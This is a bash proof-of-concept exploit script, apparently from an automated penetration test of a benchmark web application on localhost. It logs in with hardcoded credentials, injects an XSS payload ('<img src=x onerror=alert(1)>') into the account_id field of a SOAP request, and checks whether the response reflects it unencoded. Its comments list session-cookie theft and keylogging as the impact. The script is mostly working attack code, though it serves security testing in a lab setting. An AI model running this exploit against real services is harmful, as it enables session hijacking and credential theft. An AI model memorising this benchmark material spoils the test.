#!/bin/bash
# POC: Demonstrates Stored XSS vulnerability via SOAP response injection using simplified SOAP request format. Authenticates, sends GetAccountInfoRequest with XSS payload in account_id parameter, and verifies the payload is reflected unencoded in the response.
# Target: ./repo
# Created: 2025-10-31T17:04:38.968Z
# Session: benchmark-XBEN-032-24-mhf2utzd

echo "=========================================="
echo "Stored XSS via SOAP Response Injection POC"
echo "=========================================="
echo ""

TARGET="http://localhost:8080"
SESSION_COOKIE=""

# Step 1: Login to get session cookie
echo "[*] Step 1: Authenticating to get session cookie..."
LOGIN_RESPONSE=$(curl -s -i -X POST "$TARGET/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=john&password=password123" 2>&1)

if [ $? -ne 0 ]; then
    echo "[!] Error: Could not connect to target. Is the application running?"
    exit 1
fi

SESSION_COOKIE=$(echo "$LOGIN_RESPONSE" | grep -i "Set-Cookie: session=" | sed 's/.*session=\([^;]*\).*/\1/' | head -n 1)

if [ -z "$SESSION_COOKIE" ]; then
    echo "[!] Error: Failed to obtain session cookie. Login may have failed."
    echo "$LOGIN_RESPONSE"
    exit 1
fi

echo "[+] Successfully authenticated. Session cookie obtained."
echo ""

# Step 2: Send SOAP request with XSS payload (simplified format based on XXE finding)
echo "[*] Step 2: Sending SOAP request with XSS payload in account_id..."
echo "[*] Payload: 123<img src=x onerror=alert(1)>"
echo ""

# Using HTML entity encoding for the XSS payload
XSS_PAYLOAD='123&lt;img src=x onerror=alert(1)&gt;'

SOAP_REQUEST="<GetAccountInfoRequest><account_id>$XSS_PAYLOAD</account_id></GetAccountInfoRequest>"

SOAP_RESPONSE=$(curl -s -X POST "$TARGET/soap_service" \
  -H "Cookie: session=$SESSION_COOKIE" \
  -H "Content-Type: application/xml" \
  -d "$SOAP_REQUEST")

echo "[*] SOAP Response received:"
echo "$SOAP_RESPONSE"
echo ""

# Step 3: Check if XSS payload is reflected unencoded
echo "[*] Step 3: Analyzing response for XSS vulnerability..."
echo ""

if echo "$SOAP_RESPONSE" | grep -q '<img src=x onerror=alert(1)>'; then
    echo "[+] VULNERABILITY CONFIRMED!"
    echo "[+] XSS payload is reflected UNENCODED in the SOAP response."
    echo ""
    echo "[!] The response contains: <img src=x onerror=alert(1)>"
    echo "[!] When the dashboard uses innerHTML to render this response,"
    echo "[!] the <img> tag will be inserted into the DOM and execute JavaScript."
    echo ""
    echo "Attack Impact:"
    echo "  - JavaScript executes in victim's browser context"
    echo "  - Session cookies can be stolen"
    echo "  - Arbitrary actions can be performed as the victim"
    echo "  - Keylogging and credential theft possible"
    echo ""
    exit 0
elif echo "$SOAP_RESPONSE" | grep -q '&lt;img src=x onerror=alert(1)&gt;'; then
    echo "[-] XSS payload is properly encoded in response (no vulnerability)"
    echo "[*] Response contains: &lt;img src=x onerror=alert(1)&gt;"
    exit 1
elif echo "$SOAP_RESPONSE" | grep -q '<error>'; then
    echo "[!] Error: SOAP request returned an error"
    echo "$SOAP_RESPONSE"
    exit 1
else
    echo "[?] Could not determine if XSS payload is in response"
    echo "[*] Full response:"
    echo "$SOAP_RESPONSE"
    exit 1
fi